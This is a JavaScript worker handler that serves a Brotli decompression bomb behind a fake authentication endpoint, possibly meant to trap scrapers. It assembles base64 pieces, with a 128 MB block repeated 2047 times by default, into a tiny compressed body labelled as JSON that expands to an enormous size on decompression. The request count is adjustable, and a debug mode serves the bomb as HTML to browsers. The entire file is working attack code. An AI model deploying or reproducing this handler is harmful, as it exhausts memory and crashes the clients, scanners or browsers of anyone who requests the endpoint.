const brotliBombParts = {
    Header: "z///f/gnAOKxQCD3/p/////wTwDEYQGA7v0/////4Z8AiMMiAN37f/7//8M/ARCHBQC69//8//==",
    Seq128MB:
        "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/z///f/gnAOKwAED3/p/////wTwDEYQGA7v0/////4Z8AiMMCAN37f/7//8M/ARCHBQC69//8//",
    Footer: "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/Pw",
};

function base64ToUint8Array(base64) {
    const binaryStr = atob(base64);
    const len = binaryStr.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryStr.charCodeAt(i);
    }
    return bytes;
}

const partsBin = {
    header: base64ToUint8Array(brotliBombParts.Header),
    seq: base64ToUint8Array(brotliBombParts.Seq128MB),
    footer: base64ToUint8Array(brotliBombParts.Footer),
};
const DEFAULT_COUNT = 2047;

function getBrotliBombBuffer(count) {
    const totalLength =
        partsBin.header.length +
        partsBin.seq.length * count +
        partsBin.footer.length;

    const buffer = new Uint8Array(totalLength);

    let offset = 0;

    buffer.set(partsBin.header, offset);
    offset += partsBin.header.length;

    for (let i = 0; i < count; i++) {
        buffer.set(partsBin.seq, offset);
        offset += partsBin.seq.length;
    }

    buffer.set(partsBin.footer, offset);

    return buffer;
}

function uint8ArrayToArrayBuffer(u8) {
    const buffer = new ArrayBuffer(u8.length);
    const view = new Uint8Array(buffer);
    view.set(u8);
    return buffer;
}

export default async function handleRequest(request) {
    const url = new URL(request.url);
    const params = url.searchParams;

    const debug = params.get("debug") === "true";
    const count = parseInt(params.get("count")) || DEFAULT_COUNT;

    if (request.method !== "POST" && !debug) {
        return new Response(
            JSON.stringify({
                error: "Method Not Allowed",
                message: "Please use POST to authenticate or retrieve data.",
            }),
            {
                status: 405,
                headers: {
                    "Content-Type": "application/json",
                    Allow: "POST",
                },
            },
        );
    }

    const acceptEncoding = request.headers.get("Accept-Encoding");

    if (
        !acceptEncoding ||
        (!acceptEncoding.includes("br") && !acceptEncoding.includes("*"))
    ) {
        return new Response("Require Accept-Encoding: br", { status: 406 });
    }

    const brotliBomb = uint8ArrayToArrayBuffer(getBrotliBombBuffer(count));

    return new Response(brotliBomb, {
        encodeBody: "manual",
        headers: {
            "Content-Encoding": "br",
            "Content-Length": brotliBomb.byteLength.toString(),
            "Content-Type": debug
                ? "text/html; charset=utf-8"
                : "application/json",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
        },
    });
}
